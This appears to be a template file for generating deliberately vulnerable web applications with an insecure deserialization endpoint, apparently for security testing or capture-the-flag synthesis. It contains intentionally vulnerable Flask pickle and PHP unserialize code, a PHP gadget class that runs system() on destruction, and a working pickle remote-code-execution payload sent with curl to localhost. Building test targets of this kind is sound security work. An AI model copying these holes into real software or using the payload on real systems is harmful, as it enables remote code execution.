---
id: insecure_deserialization
description: Creates a web endpoint that insecurely deserializes user-supplied data, leading to arbitrary code execution or object injection.
required_vars: [endpoint_path, parameter_name]
---

# Atom: Insecure Deserialization
Creates a vulnerable endpoint in a web application that takes user-controlled serialized data and unmarshals/deserializes it without safe boundaries or type checking. This commonly allows attackers to instantiate arbitrary classes and achieve Remote Code Execution (RCE).

### Logic Requirements:
1. Define a web route at `<endpoint_path>` that accepts data via a specific parameter `<parameter_name>` (often in a POST body, a query parameter, or a Cookie).
2. The endpoint must decode the input (e.g., base64 decode) if applicable, and pass it directly to a vulnerable deserialization function.
3. The server must have classes or libraries available in its environment (gadget chains) so meaningful exploitation is possible. (Often built-in libraries like `os` or `subprocess` in Python are sufficient).

### Common Patterns:
- **Python (Pickle):**
  ```python
  import pickle
  import base64
  from flask import Flask, request

  app = Flask(__name__)

  @app.route('/<endpoint_path>', methods=['POST'])
  def deserialize():
      data = request.form.get('<parameter_name>')
      if data:
          # VULNERABILITY: Unpickling user-controlled data
          obj = pickle.loads(base64.b64decode(data))
          return "Data processed", 200
      return "No data provided", 400
  ```
- **PHP (unserialize):**
  ```php
  <?php
  class ExampleGadget {
      public $cmd;
      function __destruct() {
          system($this->cmd);
      }
  }

  if (isset($_POST['<parameter_name>'])) {
      // VULNERABILITY: Unsafe unserialize()
      $data = unserialize(base64_decode($_POST['<parameter_name>']));
      echo "Processed";
  }
  ?>
  ```

### Testing Guidance:
1. Start the target web application.
2. Generate a malicious serialized payload. For Python (`pickle`):
   ```python
   import pickle, base64, os
   class RCE:
       def __reduce__(self):
           return (os.system, ('touch /tmp/pwned',))
   print(base64.b64encode(pickle.dumps(RCE())).decode())
   ```
3. Send the payload to the vulnerably endpoint:
   ```bash
   curl -X POST http://localhost/<endpoint_path> -d "<parameter_name>=<BASE64_PAYLOAD>"
   ```
4. Verify execution of the command (e.g., check that `/tmp/pwned` was created or check server logs).

### Synthesis Guidance:
Ensure the web application code includes the necessary route and appropriate imports for the deserialization format (e.g., `pickle` for Python, `unserialize` for PHP). The payload mechanism is usually most stable when the input is base64 encoded first, so ensure the vulnerable code handles base64 decoding prior to deserialization. If writing for PHP, consider scaffolding a simple vulnerable "__destruct" or "__wakeup" magic method gadget within the same scope to make the RCE trivial without relying on external frameworks.